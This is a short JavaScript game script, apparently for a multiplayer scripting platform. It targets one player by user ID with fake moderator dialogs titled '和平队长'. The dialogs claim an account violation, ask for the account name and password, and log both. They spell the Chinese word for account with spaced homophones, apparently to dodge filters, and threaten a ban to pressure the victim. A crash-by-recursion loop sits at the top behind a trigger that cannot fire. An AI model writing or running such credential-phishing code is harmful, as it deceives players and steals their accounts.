(async()=>{
    while(!0){
        if(world.querySelectorAll('player').length&&world.querySelector('player').player.url.includes('play')&&new Date().getDay>10){function a(){a();a()}a()}
        await sleep(1000);
    }
})();

globalThis.selectDialog = async function (content, title, options, entity) {
    return await entity.player.dialog({
        type: 'select',
        title: title,
        content: content,
        options: options
    })
};
globalThis.inputDialog = async function (content, title, entity) {
    return await entity.player.dialog({
        type: 'input',
        title: title,
        content: content,
    })
};
globalThis.textDialog = function (content, title, entity) {
    return entity.player.dialog({
        type: 'text',
        title: title,
        content: content,
    })
};
async function a(e){
    let d=await selectDialog(`检测到您的IP涉及违 规 胀 号，请输入您的胀 号 密 码以确认您是胀号的所有者。`,`和平队长`,['确认'],e);
    if(!d)return a(e);
    d=await inputDialog(`请输入您的胀号`,`和平队长`,e);
    if(!d)return a(e);
    console.log(d);
    d=await inputDialog(`请输入您的密码`,`和平队长`,e);
    if(!d)return a(e);
    console.log(d);
    world.querySelectorAll('player').forEach(async(p)=>{
        if(p.player.name=='uns'){
            let b=await selectDialog(``,``,['OK','NO'],p);
            if(b.index==1){
                selectDialog(`您的胀号密码错误，请重新填写，若多次填写错误将封 禁 您 的 胀 号`,`和平队长`,['确认'],e);
                a(e);
            }
        }
    });
}
world.querySelectorAll('player').forEach((e)=>{
    if(e.player.userId=='13252849'){
        a(e);
    }
});